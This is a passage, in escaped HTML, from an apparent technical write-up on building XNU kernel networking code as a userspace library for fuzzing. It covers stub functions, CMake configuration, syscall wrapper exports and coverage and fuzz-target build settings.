class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;not&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;found &lt;/span&gt;&lt;span class="c6"&gt;for&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;architecture x86_64&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;clang&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;error&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;linker command failed &lt;/span&gt;&lt;span class="c6"&gt;with&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;exit&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;code &lt;/span&gt;&lt;span class="c3"&gt;1&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;use&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0"&gt;v to see invocation&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;ninja&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;build stopped&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;subcommand failed&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c11"&gt;&lt;span&gt;&lt;br&gt;To get our initial targeted fuzzer working, we can do a simple trick by linking against a file containing stubbed implementations of all of these. We take advantage of C&amp;rsquo;s weak type system here. For each function we need to implement, we can link an implementation &lt;/span&gt;&lt;span class="c9"&gt;void func() { assert(false); }&lt;/span&gt;&lt;span&gt;. The arguments passed to the function are simply ignored, and a crash will occur whenever the target code attempts to call it. This goal can be achieved with linker flags, but it was a simple enough solution that allowed me to get nice backtraces when I hit an unimplemented function.&lt;/span&gt;&lt;/p&gt;&lt;a id="t.b8228357b6d205653ae1179c620e72df885cb433"&gt;&lt;/a&gt;&lt;a id="t.3"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c17"&gt;// Unimplemented stub functions&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c17"&gt;// These should be replaced with real or mock impls.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c17"&gt;#include&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;&amp;lt;kern/assert.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c17"&gt;#include&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;&amp;lt;stdbool.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c6"&gt;int&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;printf&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;const&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;char&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;format&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;...);&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c6"&gt;void&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c13"&gt;Assert&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;const&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;char&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;file&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;int&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;line&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;const&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;char&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;expression&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; printf&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c19"&gt;&amp;quot;%s: assert failed on line %d: %s\n&amp;quot;&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;file&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;line&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;expression&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; __builtin_trap&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c6"&gt;void&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c13"&gt;IOBSDGetPlatformUUID&lt;/span&gt;&lt;span class="c1"&gt;()&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;assert&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;false&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c6"&gt;void&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c13"&gt;IOMapperInsertPage&lt;/span&gt;&lt;span class="c1"&gt;()&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;assert&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;false&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c17"&gt;// ...&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c11"&gt;&lt;span class="c8 c2"&gt;&lt;br&gt;Then we just link this file into the XNU library we&amp;rsquo;re building by adding it to the source list:&lt;/span&gt;&lt;/p&gt;&lt;a id="t.534c83683172ba6897a00c87407d33404b429f6e"&gt;&lt;/a&gt;&lt;a id="t.4"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c6"&gt;set&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0 c2"&gt;XNU_SOURCES&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; bsd&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;conf&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;param&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0 c2"&gt;c&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; bsd&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;kern&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;kern_asl&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0 c2"&gt;c&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;# ...&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; fuzz&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;syscall_wrappers&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0 c2"&gt;c&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; fuzz&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;ioctl&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0 c2"&gt;c&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; fuzz&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;backend&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0 c2"&gt;c&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; fuzz&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;stubs&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0 c2"&gt;c&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; fuzz&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;fake_impls&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;c&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c11"&gt;&lt;span&gt;&lt;br&gt;As you can see, there are some other files I included in the XNU library that represent faked implementations and helper code to expose some internal kernel APIs. To make sure our fuzz target will call code in the linked library, and not some other host functions (syscalls) with a clashing name, we hide all of the symbols in &lt;/span&gt;&lt;span class="c9"&gt;libxnu&lt;/span&gt;&lt;span&gt;&amp;nbsp;by default and then expose a set of wrappers that call those functions on our behalf. I hide all the names by default using a CMake setting &lt;/span&gt;&lt;span class="c9"&gt;set_target_properties(xnu PROPERTIES C_VISIBILITY_PRESET hidden)&lt;/span&gt;&lt;span class="c8 c2"&gt;. Then we can link in a file (fuzz/syscall_wrappers.c) containing wrappers like the following:&lt;/span&gt;&lt;/p&gt;&lt;a id="t.e0503b6026972fa7d7dd9fa845e61836b2ed21ca"&gt;&lt;/a&gt;&lt;a id="t.5"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;__attribute__&lt;/span&gt;&lt;span class="c1"&gt;((&lt;/span&gt;&lt;span class="c0"&gt;visibility&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c19"&gt;&amp;quot;default&amp;quot;&lt;/span&gt;&lt;span class="c1"&gt;)))&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;int&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;accept_wrapper&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;int&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;s&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;caddr_t name&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; socklen_t&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;anamelen&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;int&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;retval&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;accept_args uap &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;s &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;s&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;name &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;name&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;anamelen &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;anamelen&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;};&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;return&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;accept&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;kernproc&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c0"&gt;uap&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;retval&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18"&gt;&lt;span&gt;Note the visibility attribute that explicitly exports the symbol from the library. Due to the simplicity of these wrappers I created a script to automate this called generate_fuzzer.py using &lt;/span&gt;&lt;span class="c9"&gt;syscalls.master&lt;/span&gt;&lt;span class="c8 c2"&gt;.&lt;br&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span class="c8 c2"&gt;With the stubs in place, we can start writing a fuzz target now and come back to deal with implementing them later. We will see a crash every time the target code attempts to use one of the functions we initially left out. Then we get to decide to either include the real implementation (and perhaps recursively require even more stubbed function implementations) or to fake the functionality.&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span&gt;A bonus of getting a build working with CMake was to create multiple targets with different instrumentation. Doing so allows me to generate coverage reports using clang-coverage:&lt;/span&gt;&lt;/p&gt;&lt;a id="t.e3e5dbef0102c66c9a42aebd0535293cd5f2fcba"&gt;&lt;/a&gt;&lt;a id="t.6"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;target_compile_options&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;xnu&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0"&gt;cov PRIVATE $&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;span class="c0"&gt;XNU_C_FLAGS&lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0"&gt;DLIBXNU_BUILD&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;1&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0"&gt;D_FORTIFY_SOURCE&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;0&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0"&gt;fprofile&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0"&gt;instr&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0"&gt;generate &lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0"&gt;fcoverage&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0"&gt;mapping&lt;/span&gt;&lt;span class="c1 c2"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c11"&gt;&lt;span class="c8 c2"&gt;&lt;br&gt;With that, we just add a fuzz target file and a protobuf file to use with protobuf-mutator and we&amp;rsquo;re ready to get started:&lt;/span&gt;&lt;/p&gt;&lt;a id="t.94984d9cd1732c1405481ef4bebbc7ba7e4bcac5"&gt;&lt;/a&gt;&lt;a id="t.7"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;protobuf_generate_cpp&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;NET_PROTO_SRCS NET_PROTO_HDRS fuzz&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;net_fuzzer&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;proto&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;add_executable&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;net_fuzzer fuzz&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;net_fuzzer&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;cc $&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;span class="c0"&gt;NET_PROTO_SRCS&lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;$&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;span class="c0"&gt;NET_PROTO_HDRS&lt;/span&gt;&lt;span class="c1"&gt;})&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;target_include_directories&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;net_fuzzer PRIVATE libprotobuf&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0"&gt;mutator&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;target_compile_options&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0 c2"&gt;net_fuzzer&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;PRIVATE &lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0 c2"&gt;g&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0"&gt;std&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;c&lt;/span&gt;&lt;span class="c1"&gt;++&lt;/span&gt;&lt;span class="c3"&gt;11&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c13"&gt;Werror&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c13"&gt;Wno&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0"&gt;address&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0"&gt;of&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0"&gt;packed&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0 c2"&gt;member&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;$&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;span class="c0"&gt;FUZZER_CXX_FLAGS&lt;/span&gt;&lt;span class="c1"&gt;})&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c6"&gt;if&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;APPLE&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;target_link_libraries&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;net_fuzzer $&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;span class="c0"&gt;FUZZER_LD_FLAGS&lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;xnu fuzzer protobuf&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0"&gt;mutator $&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;span class="c13"&gt;Protobuf_LIBRARIES&lt;/span&gt;&lt;span class="c1"&gt;})&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c6"&gt;else&lt;/span&gt;&lt;span class="c1"&gt;()&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;target_link_libraries&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;net_fuzzer $&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;span class="c0"&gt;FUZZER_LD_FLAGS&lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;xnu fuzzer protobuf&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0"&gt;mutator $&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;span class="c13"&gt;Protobuf_LIBRARIES&lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;pthread&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;endif&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;APPLE&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c11 